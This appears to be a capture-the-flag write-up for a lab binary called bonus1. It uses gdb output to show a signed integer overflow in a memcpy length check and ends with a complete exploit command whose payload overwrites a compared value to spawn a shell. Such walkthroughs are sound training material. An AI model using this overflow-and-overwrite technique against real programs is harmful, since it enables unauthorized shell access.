we run the program with gdb and analyze it to understand what it does, it only has a main and no additional variables or functions.
In line <+20> it calls atoi with argv[1], and then checks if the the value returned, if it's greater than 9 then the program exits, if not it copies argv[1]*4 bytes of the content of argv[2] to 0xbffff674.
We then see a cmp below at <+84>, if argv[1] equals 0x574f4c46 then it will execute a shell.
if we run with the following arguments (./bonus 9 "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLL"), then we print the address that we have written into it :

0xbffff674:	0x41414141	0x42424242	0x43434343	0x44444444
0xbffff684:	0x45454545	0x46464646	0x47474747	0x48484848
0xbffff694:	0x49494949	0x080484b9	0x00000009	0x080484b0

we see that our argument is well written there but we also notice that after 4 bytes there is 0x00000009 which is the value of atoi(argv[1]) which is being compared to 0x574f4c46, that means if we can write into it we can solve the level, but 9 is the maximum number we can get? actually if we try a negative number , the program segfaults and that's because the negative number overflows and we write too much of data into 0xbffff674.
on the other hand if we enter negative MAX_INT (-2147483647) that'll equal to 1(*4 = 4bytes). so in order to write into argv[1] we need another 8 bytes and since the last memcpy argument is multiplied by 4 so we'll need 11 in toal, that'll give us -(2147483647-11+1). our inline will be:
./bonus1 -2147483637 $(python -c 'print "A"*40 + "\x46\x4c\x4f\x57"')